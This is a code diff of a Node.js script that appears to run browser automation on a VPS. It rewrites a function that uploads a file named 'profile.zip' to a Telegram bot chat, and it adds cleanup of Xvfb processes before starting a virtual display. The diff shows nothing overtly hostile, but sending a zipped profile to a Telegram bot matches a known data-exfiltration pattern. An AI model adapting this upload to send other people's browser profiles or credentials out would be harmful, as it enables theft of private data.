@@ -134,41 +134,23 @@ function tgRequest(method, data = {}) {
 
 function uploadToTelegram(filePath) {
     return new Promise((resolve, reject) => {
-        const fileStream = fs.createReadStream(filePath);
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('document', fs.createReadStream(filePath), 'profile.zip');
 
-        const form = {
-            chat_id: CHAT_ID,
-            document: fileStream
-        };
-
-        const req = https.request({
-            hostname: "api.telegram.org",
-            path: `/bot${BOT_TOKEN}/sendDocument`,
-            method: "POST"
-        }, (res) => {
-            let body = "";
-            res.on("data", d => body += d);
-            res.on("end", () => {
-                const json = JSON.parse(body);
-                resolve(json.result.document.file_id);
-            });
-        });
-
-        const boundary = "----NODEFORM";
-        req.setHeader("Content-Type", "multipart/form-data; boundary=" + boundary);
-
-        req.write("--" + boundary + "\r\n");
-        req.write(`Content-Disposition: form-data; name="chat_id"\r\n\r\n${CHAT_ID}\r\n`);
-        req.write("--" + boundary + "\r\n");
-        req.write(`Content-Disposition: form-data; name="document"; filename="profile.zip"\r\n\r\n`);
-
-        fileStream.on("data", chunk => req.write(chunk));
-        fileStream.on("end", () => {
-            req.write("\r\n--" + boundary + "--");
-            req.end();
-        });
-
-        req.on("error", reject);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+            method: 'POST',
+            body: form
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok && data.result?.document?.file_id) {
+                resolve(data.result.document.file_id);
+            } else {
+                reject(new Error(data.description || 'Upload failed'));
+            }
+        })
+        .catch(reject);
     });
 }
 
@@ -373,10 +355,20 @@ function setupVPSEnvironment() {
 }
 
 async function startVirtualDisplay() {
+    log('info', 'XVFB', 'Cleaning up old Xvfb processes...');
+    
+    try {
+        execSync('pkill -f Xvfb', { stdio: 'ignore' });
+        execSync('rm -f /tmp/.X99-lock', { stdio: 'ignore' });
+    } catch (e) {}
+
     log('info', 'XVFB', 'Starting Virtual Display (DISPLAY=:99)...');
-    xvfbProcess = spawn('Xvfb', [':99', '-screen', '0', '1280x800x24']);
+    xvfbProcess = spawn('Xvfb', [':99', '-screen', '0', '1280x800x24'], {
+        stdio: 'ignore'
+    });
+    
     process.env.DISPLAY = ':99';
-    await new Promise(r => setTimeout(r, 2000));
+    await new Promise(r => setTimeout(r, 3000));
     log('success', 'DISPLAY', 'Virtual Display ready!');
 }
 
